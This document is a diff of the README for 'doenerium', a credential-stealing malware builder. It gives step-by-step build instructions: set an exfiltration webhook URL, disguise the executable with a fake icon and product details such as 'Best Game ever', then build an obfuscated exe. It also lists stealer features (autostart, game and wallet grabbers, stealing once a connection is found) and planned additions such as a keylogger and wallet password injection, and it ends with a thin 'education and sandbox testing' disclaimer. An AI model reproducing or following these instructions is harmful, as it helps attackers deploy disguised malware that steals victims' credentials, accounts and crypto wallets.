@@ -2,39 +2,39 @@
 
 |     〢 Table of Contents 〢       |
 |-----------------------------------|
-| [📁 Setting up](#setup)          |
+| [📁 Setup & Requirements](#setup)|
 | [⚔️ Features](#features)         |
-| [📸 Screenshots](#screenshot)    |
-| [📝 Todo](#todo)                 |
+| [📸 Screenshots](#screenshots)    |
+| [📝 Todo](#to-do)                 |
 | [📜 License](#license)           | 
-| [⚠️ Note](#note)                 |
+| [⚠️ Note](#disclaimer)                 |
 
 <a id="setup"></a>
 
 ---
 
-### 📁  〢 Setting Up
+## 📁 Setup // Requirements
 
-> Install [Node.js](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi) `IMPORTANT: Install NodeJS version 18.15.0`
-> 
-> ***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
->
-> To avoid any circumstances. Please also install [the latest version of Visual Studio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030) including the `"Desktop development with C++" workload."`.
->
-> **Note:** When installing Visual Studio with the **"Desktop development with C++"** workload make sure to also install `MSVC v141 - VS 2017 C++ x64/x86 build  tools`
->
-> Then run the **_install.bat_** file to install all necessary packages
->
-> If you are getting errors: Try running the **_fix.bat_** file to automatically fix common issues.
->
-> Replace _REPLACE_ME_ with your webhook url in **_config.js_**
->
-> Replace the **"default.ico"** file with the icon you would like to have on your executable. 
-> ``The filetype must be ".ico"! and the icon should be 256x256 OR 128x128 but 256x256 works the best`` 
->
-> Lastly add a File Description, ProductName, LegalCopyright & OriginalFilename in ``config.js`` 
->
-> An example would be:
+ Install [Node.js](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi) `IMPORTANT: Install NodeJS version 18.15.0`
+ 
+***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
+
+To avoid any circumstances. Please also install [the latest version of Visual Studio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030) including the `"Desktop development with C++" workload."`.
+
+**Note:** When installing Visual Studio with the **"Desktop development with C++"** workload make sure to also install `MSVC v141 - VS 2017 C++ x64/x86 build  tools`
+
+Then run the **_install.bat_** file to install all necessary packages
+
+If you are getting errors: Try running the **_fix.bat_** file to automatically fix common issues.
+
+Replace _REPLACE_ME_ with your webhook url in **_config.js_**
+
+Replace the **"default.ico"** file with the icon you would like to have on your executable. 
+``The filetype must be ".ico"! and the icon should be 256x256 OR 128x128 but 256x256 works the best`` 
+
+Lastly add a File Description, ProductName, LegalCopyright & OriginalFilename in ``config.js`` 
+
+An example would be:
 ```
 properties: {
     FileDescription: 'Best Game ever',
@@ -44,16 +44,14 @@ properties: {
 }
 
 ```
->
-> Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.
+
+Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.
 
 <a id="features"></a>
 
 ---
 
-### ⚔️ 〢 Features
-
-#### Stealer
+## ⚔️ Features
 
 > Autostart (Startup)
 >
@@ -101,7 +99,7 @@ properties: {
 >
 > Growtopia save.dat stealer
 
-#### Additional
+#### Additionally...
 
 > Internet connection check every 3 seconds before it starts stealing
 >
@@ -117,31 +115,32 @@ properties: {
 >
 > Automatic obfuscation when building
 
-<a id="screenshot"></a>
+<a id="screenshots"></a>
 
 ---
 
-### 📸 〢 Screenshots
+## 📸 Screenshots
 
-<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/2.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/6.png?raw=true" alt="" width="539">
-<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/7.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/8.png?raw=true" alt="" width="539">
-<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/9.png?raw=true" alt="" width="539"><img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/10.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/2.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/6.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/7.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/8.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/9.png?raw=true" alt="" width="539">
+<img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/10.png?raw=true" alt="" width="539">
 <img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/12.png?raw=true" alt="" width="539">
 <img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/13.png?raw=true" alt="" width="539">
 <img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/14.png?raw=true" alt="" width="539">
 <img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/15.jpg?raw=true" alt="" width="539">
-
 <img title="" src="https://i.imgur.com/hFryuaR.png" alt="" width="639">
 <img title="" src="https://github.com/doenerium69/doenerium/blob/main/screenshots/11.png?raw=true" alt="" width="639">
 
 
-<a id="todo"></a>
+<a id="to-do"></a>
 
 ---
 
-### 📝 〢 Todo
+## 📝 To-Do
 
-> - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
 > - More grabbers (VPN's, Gaming, Messengers)
 > - Keylogger
 > - Discord bot to build within discord ($build <webhook_url>)
@@ -152,15 +151,15 @@ properties: {
 
 ---
 
-### 📜 〢 License
+## 📜 〢 License
 
-By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
+By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/).
 
-<a id="note"></a>
+<a id="disclaimer"></a>
 
 ---
 
-### ⚠️ 〢 Note
+### ⚠️ Disclaimer
 
 I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
 
